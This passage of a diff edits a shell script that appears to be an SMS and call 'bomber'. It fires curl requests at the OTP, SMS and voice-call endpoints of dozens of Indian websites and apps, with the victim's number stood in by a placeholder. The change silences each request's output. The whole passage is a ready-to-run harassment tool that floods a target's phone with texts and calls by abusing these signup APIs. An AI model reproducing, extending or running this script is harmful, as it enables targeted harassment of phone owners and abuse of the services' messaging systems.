   --data-raw '{"mobile":"€tor","organizationId":"5eb393ee95fab7468a79d189"}' \
-  --compressed
-
+  --compressed > /dev/null 2>&1
 curl 'https://in.vclubhouse.xyz/api/sms/ali_send' \
   -H 'authority: in.vclubhouse.xyz' \
   -H 'accept: application/json, text/plain, */*' \
@@ -955,8 +877,7 @@ curl 'https://in.vclubhouse.xyz/api/sms/ali_send' \
   -H 'token;' \
   -H 'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36 Edg/110.0.1587.57' \
   --data-raw 'mobile=91€tor' \
-  --compressed
-
+  --compressed > /dev/null 2>&1
 curl 'https://gql.meatigo.com/' \
   -H 'authority: gql.meatigo.com' \
   -H 'accept: application/json, text/plain, */*' \
@@ -971,8 +892,7 @@ curl 'https://gql.meatigo.com/' \
   -H 'sec-fetch-site: same-site' \
   -H 'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36 Edg/110.0.1587.57' \
   --data-raw '{"query":"\n      query($input: mobileInput){\n        getOTP(input: $input) {\n          code\n          message\n          causes\n          totalElements\n          data {\n            mobile\n            returningUser\n          }\n        }\n      }\n    ","variables":{"input":{"mobile":"€tor","communicationPreference":true}}}' \
-  --compressed
-
+  --compressed > /dev/null 2>&1
 curl 'https://session-service.aakash.ac.in/prod/sess/api/v1/user/phone/otp/' \
   -H 'authority: session-service.aakash.ac.in' \
   -H 'accept: */*' \
@@ -990,8 +910,7 @@ curl 'https://session-service.aakash.ac.in/prod/sess/api/v1/user/phone/otp/' \
   -H 'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36 Edg/110.0.1587.57' \
   -H 'x-client-id: a6fbf1d2-27c3-46e1-b149-0380e506b763' \
   --data-raw '{"action":"generate","phone":"€tor","access":"signup"}' \
-  --compressed
-
+  --compressed > /dev/null 2>&1
 curl 'https://api.prod.astrotalk.in/AstroTalk/login/v2/user/mobile-otp-login' \
   -H 'authority: api.prod.astrotalk.in' \
   -H 'accept: application/json, text/plain, */*' \
@@ -1007,8 +926,7 @@ curl 'https://api.prod.astrotalk.in/AstroTalk/login/v2/user/mobile-otp-login' \
   -H 'sec-fetch-site: cross-site' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
   --data-raw $'------WebKitFormBoundaryFt4CyQkJLaxELnmd\r\nContent-Disposition: form-data; name="countryCode"\r\n\r\n+91\r\n------WebKitFormBoundaryFt4CyQkJLaxELnmd\r\nContent-Disposition: form-data; name="isCall"\r\n\r\nfalse\r\n------WebKitFormBoundaryFt4CyQkJLaxELnmd\r\nContent-Disposition: form-data; name="appId"\r\n\r\n3\r\n------WebKitFormBoundaryFt4CyQkJLaxELnmd\r\nContent-Disposition: form-data; name="businessId"\r\n\r\n1\r\n------WebKitFormBoundaryFt4CyQkJLaxELnmd\r\nContent-Disposition: form-data; name="mobile"\r\n\r\n€tor\r\n------WebKitFormBoundaryFt4CyQkJLaxELnmd--\r\n' \
-  --compressed
-
+  --compressed > /dev/null 2>&1
 curl 'https://api.khatabook.com/v1/auth/request-otp' \
   -H 'authority: api.khatabook.com' \
   -H 'accept: */*' \
@@ -1029,8 +947,7 @@ curl 'https://api.khatabook.com/v1/auth/request-otp' \
   -H 'x-kb-new-auth: false' \
   -H 'x-kb-platform: web' \
   --data-raw '{"country_code":"+91","phone":"€tor","app_signature":"Jc/Zu7qNqQ2"}' \
-  --compressed
-
+  --compressed > /dev/null 2>&1
 curl 'https://ullu.app/ulluCore/api/v1/otp/send/new/cdiOpn?mobileNumber=€tor' \
   -X 'POST' \
   -H 'authority: ullu.app' \
@@ -1047,8 +964,7 @@ curl 'https://ullu.app/ulluCore/api/v1/otp/send/new/cdiOpn?mobileNumber=€tor' 
   -H 'sec-fetch-mode: cors' \
   -H 'sec-fetch-site: same-origin' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
-  --compressed
-
+  --compressed > /dev/null 2>&1
 curl 'https://api.countrydelight.in/api/auth/new_request_otp' \
   -H 'authority: api.countrydelight.in' \
   -H 'accept: application/json, text/plain, */*' \
@@ -1064,8 +980,7 @@ curl 'https://api.countrydelight.in/api/auth/new_request_otp' \
   -H 'sec-fetch-site: same-site' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
   --data-raw '{"mobile_no":"€tor","new_user":true}' \
-  --compressed
-
+  --compressed > /dev/null 2>&1
 curl 'https://www.khelplayrummy.com/component/weaver/?task=registration.otpBasedCommonAjaxFunction' \
   -H 'authority: www.khelplayrummy.com' \
   -H 'accept: */*' \
@@ -1083,8 +998,7 @@ curl 'https://www.khelplayrummy.com/component/weaver/?task=registration.otpBased
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
   -H 'x-requested-with: XMLHttpRequest' \
   --data-raw 'control=GET_OTP&sMobileOrEmailOperation=MOBILE&sOperation=REGISTRATION&sUserName=€tor&isAjax=true' \
-  --compressed
-
+  --compressed > /dev/null 2>&1
 curl 'https://www.safegold.com/register' \
   -H 'authority: www.safegold.com' \
   -H 'accept: application/json, text/plain, */*' \
@@ -1102,8 +1016,7 @@ curl 'https://www.safegold.com/register' \
   -H 'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36' \
   -H 'x-requested-with: XMLHttpRequest' \
   --data-raw '{"whatsappOptStatus":true,"enable_whatsapp":true,"is_check":true,"mobile_no":"€tor","middlename":"","name":""}' \
-  --compressed
-
+  --compressed > /dev/null 2>&1
 curl 'https://login.vmartretail.com/user/signup?redirect_url=aHR0cHM6Ly9zZWN1cmUudm1hcnRyZXRhaWwuY29tL215YWNjb3VudA%253D%253D&layout=desktop' \
   -H 'authority: login.vmartretail.com' \
   -H 'accept: */*' \
@@ -1121,8 +1034,7 @@ curl 'https://login.vmartretail.com/user/signup?redirect_url=aHR0cHM6Ly9zZWN1cmU
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
   -H 'x-requested-with: XMLHttpRequest' \
   --data-raw 'email=nbvdbhf%40gmail.com&phone=€tor&register_with_password=&csrf_test_name=f951451b577e5fcb2dc687c89716fa83' \
-  --compressed
-
+  --compressed > /dev/null 2>&1
 curl 'https://entri.app/api/v3/users/check-phone/' \
   -H 'authority: entri.app' \
   -H 'accept: application/json, text/plain, */*' \
@@ -1141,8 +1053,7 @@ curl 'https://entri.app/api/v3/users/check-phone/' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
   -H 'user-language: hi' \
   --data-raw '{"phone":"+91€tor"}' \
-  --compressed
-
+  --compressed > /dev/null 2>&1
 curl 'https://nxtgenapi.pokerbaazi.com/msc/general/send-app-download-link-on-sms?mobile_no=' \
   -H 'authority: nxtgenapi.pokerbaazi.com' \
   -H 'accept: application/json' \
@@ -1158,8 +1069,7 @@ curl 'https://nxtgenapi.pokerbaazi.com/msc/general/send-app-download-link-on-sms
   -H 'sec-fetch-site: same-site' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
   --data-raw '{"mobile_no":"€tor"}' \
-  --compressed
-
+  --compressed > /dev/null 2>&1
 curl 'https://api-consumer.bharatpe.in/generic/customer/otp/generate' \
   -H 'authority: api-consumer.bharatpe.in' \
   -H 'accept: */*' \
@@ -1176,7 +1086,7 @@ curl 'https://api-consumer.bharatpe.in/generic/customer/otp/generate' \
   -H 'sec-fetch-site: cross-site' \
   -H 'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36' \
   --data-raw '{"hashKey":"","mobile":"€tor","serviceName":"POSTPE_LEAD_GENERATION","type":"MOBILE"}' \
-  --compressed
+  --compressed > /dev/null 2>&1
 curl 'https://www.planetfashion.in/capillarylogin/customerRegisterOtpCheck?isAjax=true' \
   -H 'authority: www.planetfashion.in' \
   -H 'accept: */*' \
@@ -1194,10 +1104,7 @@ curl 'https://www.planetfashion.in/capillarylogin/customerRegisterOtpCheck?isAja
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
   -H 'x-requested-with: XMLHttpRequest' \
   --data-raw 'mobileoremail=€tor&ajax=1&chkTrack=0&capillaryChk=0&gender-radio=1&firstname=c+vzc&mobile=&email=kg764096%40gmail.com' \
-  --compressed
-
-
-
+  --compressed > /dev/null 2>&1
 curl 'https://www.gamezy.com/api/auth/getOTP' \
   -H 'authority: www.gamezy.com' \
   -H 'accept: application/json, text/plain, */*' \
@@ -1213,8 +1120,7 @@ curl 'https://www.gamezy.com/api/auth/getOTP' \
   -H 'sec-fetch-mode: cors' \
   -H 'sec-fetch-site: same-origin' \
   --data-raw '{"verificationChannel":"2","mobile":"€tor"}' \
-  --compressed
-
+  --compressed > /dev/null 2>&1
 curl 'https://mightyzeus.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API&isBot=false&source=web' \
   -H 'authority: mightyzeus.housing.com' \
   -H 'accept: */*' \
@@ -1233,9 +1139,7 @@ curl 'https://mightyzeus.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API&isBot=fa
   -H 'sec-fetch-site: same-site' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
   --data-raw '{"query":"\n  mutation($email: String, $phone: String, $otpLength: Int) {\n    sendOtp(phone: $phone, email: $email, otpLength: $otpLength) {\n      success\n      message\n    }\n  }\n","variables":{"phone":"€tor"}}' \
-  --compressed
-
-
+  --compressed > /dev/null 2>&1
 curl 'https://webapi.apollo247.com/' \
   -H 'Accept-Language: en-US,en;q=0.9' \
   -H 'Connection: keep-alive' \
@@ -1252,10 +1156,7 @@ curl 'https://webapi.apollo247.com/' \
   -H 'sec-ch-ua-mobile: ?0' \
   -H 'sec-ch-ua-platform: "Windows"' \
   --data-raw $'{"operationName":"Login","variables":{"mobileNumber":"+91€tor","loginType":"PATIENT"},"query":"query Login($mobileNumber: String\u0021, $loginType: LOGIN_TYPE\u0021) {\\n  login(mobileNumber: $mobileNumber, loginType: $loginType) {\\n    status\\n    message\\n    loginId\\n    __typename\\n  }\\n}\\n"}' \
-  --compressed
-
-
-
+  --compressed > /dev/null 2>&1
 curl 'https://unacademy.com/api/v3/user/user_check/?enable-email=true' \
   -H 'authority: unacademy.com' \
   -H 'accept: */*' \
@@ -1273,9 +1174,7 @@ curl 'https://unacademy.com/api/v3/user/user_check/?enable-email=true' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
   -H 'x-platform: 0' \
   --data-raw '{"phone":"€tor","country_code":"IN","otp_type":1,"email":"","send_otp":true,"is_un_teach_user":false}' \
-  --compressed
-
-
+  --compressed > /dev/null 2>&1
 curl 'https://www.1mg.com/auth_api/v6/create_token' \
   -H 'authority: www.1mg.com' \
   -H 'accept: application/vnd.healthkartplus.v11+json' \
@@ -1299,9 +1198,7 @@ curl 'https://www.1mg.com/auth_api/v6/create_token' \
   -H 'x-html-canrender: True' \
   -H 'x-platform: Desktop-0.0.1' \
   --data-raw '{"number":"€tor","is_corporate_user":false,"is_doctor":false}' \
-  --compressed
-
-
+  --compressed > /dev/null 2>&1
 curl 'https://api.testbook.com/api/v2/otp/send?emailOrMobile=€tor&resend=true' \
   -H 'authority: api.testbook.com' \
   -H 'accept: application/json, text/plain, */*' \
@@ -1318,8 +1215,7 @@ curl 'https://api.testbook.com/api/v2/otp/send?emailOrMobile=€tor&resend=true'
   -H 'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36 Edg/110.0.1587.57' \
   -H 'x-tb-client: web,1.2' \
   --data-raw '{}' \
-  --compressed
-
+  --compressed > /dev/null 2>&1
 curl 'https://api.tendercuts.in/otp/v2/generate/' \
   -H 'authority: api.tendercuts.in' \
   -H 'accept: application/json' \
@@ -1335,15 +1231,8 @@ curl 'https://api.tendercuts.in/otp/v2/generate/' \
   -H 'sec-fetch-site: same-site' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
   --data-raw '{"mobile":"€tor","otp_mode":"SIGNUP"}' \
-  --compressed
-
-
-
-
+  --compressed > /dev/null 2>&1
 #ll..
-
-
-
 curl 'https://api.tendercuts.in/otp/retry/' \
   -H 'authority: api.tendercuts.in' \
   -H 'accept: application/json' \
@@ -1359,8 +1248,7 @@ curl 'https://api.tendercuts.in/otp/retry/' \
   -H 'sec-fetch-site: same-site' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
   --data-raw '{"mobile":"€tor","retry_mode":"voice","gateway":null}' \
-  --compressed
-
+  --compressed > /dev/null 2>&1
 curl 'https://www.1mg.com/auth_api/v6/create_token' \
   -H 'authority: www.1mg.com' \
   -H 'accept: application/vnd.healthkartplus.v11+json' \
@@ -1384,9 +1272,7 @@ curl 'https://www.1mg.com/auth_api/v6/create_token' \
   -H 'x-html-canrender: True' \
   -H 'x-platform: Desktop-0.0.1' \
   --data-raw '{"number":"€tor","is_corporate_user":false,"otp_on_call":true}' \
-  --compressed
-
-
+  --compressed > /dev/null 2>&1
 curl 'https://api.testbook.com/api/v2/otp/send?emailOrMobile=€tor&otpSentVia=call&resend=true' \
   -H 'authority: api.testbook.com' \
   -H 'accept: application/json, text/plain, */*' \
@@ -1403,8 +1289,7 @@ curl 'https://api.testbook.com/api/v2/otp/send?emailOrMobile=€tor&otpSentVia=c
   -H 'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36 Edg/110.0.1587.57' \
   -H 'x-tb-client: web,1.2' \
   --data-raw '{}' \
-  --compressed
-
+  --compressed > /dev/null 2>&1
 curl 'https://unacademy.com/api/v3/user/user_check/?enable-email=true' \
   -H 'authority: unacademy.com' \
   -H 'accept: */*' \
@@ -1422,8 +1307,7 @@ curl 'https://unacademy.com/api/v3/user/user_check/?enable-email=true' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
   -H 'x-platform: 0' \
   --data-raw '{"phone":"€tor","country_code":"IN","otp_type":2,"email":"","send_otp":true,"is_un_teach_user":false}' \
-  --compressed
-
+  --compressed > /dev/null 2>&1
 curl 'https://webapi.apollo247.com/' \
   -H 'Accept-Language: en-US,en;q=0.9' \
   -H 'Connection: keep-alive' \
@@ -1439,7 +1323,5 @@ curl 'https://webapi.apollo247.com/' \
   -H 'sec-ch-ua-mobile: ?0' \
   -H 'sec-ch-ua-platform: "Windows"' \
   --data-raw $'{"operationName":"getOTPOnCall","variables":{"mobileNumber":"+91€tor","loginType":"PATIENT","id":"0c3f4d50-b054-11ed-9846-7b73ab120606"},"query":"query getOTPOnCall($mobileNumber: String, $loginType: LOGIN_TYPE, $id: String\u0021) {\\n  getOTPOnCall(mobileNumber: $mobileNumber, loginType: $loginType, id: $id) {\\n    status\\n    loginId\\n    message\\n    __typename\\n  }\\n}\\n"}' \
-  --compressed
-
-
+  --compressed > /dev/null 2>&1
 #.
